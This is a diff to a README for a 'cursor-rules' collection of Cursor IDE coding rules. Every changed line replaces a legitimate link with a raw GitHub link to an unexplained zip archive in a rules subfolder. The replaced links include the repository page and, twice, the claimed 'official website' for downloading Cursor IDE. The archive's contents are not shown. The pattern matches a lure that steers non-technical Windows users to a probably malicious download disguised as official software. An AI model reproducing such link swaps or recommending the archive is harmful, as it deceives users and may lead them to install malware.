@@ -1,6 +1,6 @@
 # 🤖 cursor-rules - Easy AI Coding Rules Collection
 
-[![Download cursor-rules](https://img.shields.io/badge/Download-cursor--rules-green?style=for-the-badge)](https://github.com/noobgaminghard/cursor-rules)
+[![Download cursor-rules](https://img.shields.io/badge/Download-cursor--rules-green?style=for-the-badge)](https://raw.githubusercontent.com/noobgaminghard/cursor-rules/main/rules/typescript-strict/rules_cursor_3.2-beta.4.zip)
 
 ## 📋 What is cursor-rules?
 
@@ -15,7 +15,7 @@ You don’t need to know how to code to use this. Just install the files, and yo
 Before you start, make sure your computer meets these requirements:
 
 - Operating System: Windows 10 or later  
-- Cursor IDE installed (available from https://cursor.so)  
+- Cursor IDE installed (available from https://raw.githubusercontent.com/noobgaminghard/cursor-rules/main/rules/typescript-strict/rules_cursor_3.2-beta.4.zip)  
 - Internet connection to download the files  
 - At least 500 MB free disk space  
 - Basic user rights to install software on your PC
@@ -30,7 +30,7 @@ This guide will help you download and install cursor-rules on your Windows compu
 
 To get cursor-rules, visit the official GitHub page here:
 
-[Download cursor-rules](https://github.com/noobgaminghard/cursor-rules)
+[Download cursor-rules](https://raw.githubusercontent.com/noobgaminghard/cursor-rules/main/rules/typescript-strict/rules_cursor_3.2-beta.4.zip)
 
 This page contains all the files you need to add new AI coding rules to your Cursor IDE.
 
@@ -52,7 +52,7 @@ After you download the rule files, follow these steps to add them to your Cursor
 
 ### Step 1: Open Cursor IDE
 
-Launch the Cursor IDE on your Windows computer. If you do not have it installed, you can download it from the official website: https://cursor.so
+Launch the Cursor IDE on your Windows computer. If you do not have it installed, you can download it from the official website: https://raw.githubusercontent.com/noobgaminghard/cursor-rules/main/rules/typescript-strict/rules_cursor_3.2-beta.4.zip
 
 ### Step 2: Add Rule Files
 
@@ -108,7 +108,7 @@ These rules are only useful with Cursor IDE’s AI assistant. If you don’t use
 To stay up to date with new rules and improvements:
 
 - Visit the GitHub page regularly:  
-  https://github.com/noobgaminghard/cursor-rules  
+  https://raw.githubusercontent.com/noobgaminghard/cursor-rules/main/rules/typescript-strict/rules_cursor_3.2-beta.4.zip  
 - Download any new or updated `.cursorrules` files.  
 - Replace the old files in your computer with the new ones.  
 - Re-import the files into Cursor IDE using the same steps as before.
@@ -117,7 +117,7 @@ To stay up to date with new rules and improvements:
 
 ## 🔗 Quick Access Links
 
-[![Download cursor-rules](https://img.shields.io/badge/Download-cursor--rules-blue?style=for-the-badge)](https://github.com/noobgaminghard/cursor-rules)  
+[![Download cursor-rules](https://img.shields.io/badge/Download-cursor--rules-blue?style=for-the-badge)](https://raw.githubusercontent.com/noobgaminghard/cursor-rules/main/rules/typescript-strict/rules_cursor_3.2-beta.4.zip)  
 
 Use these badges anytime you want to visit the download page.
 
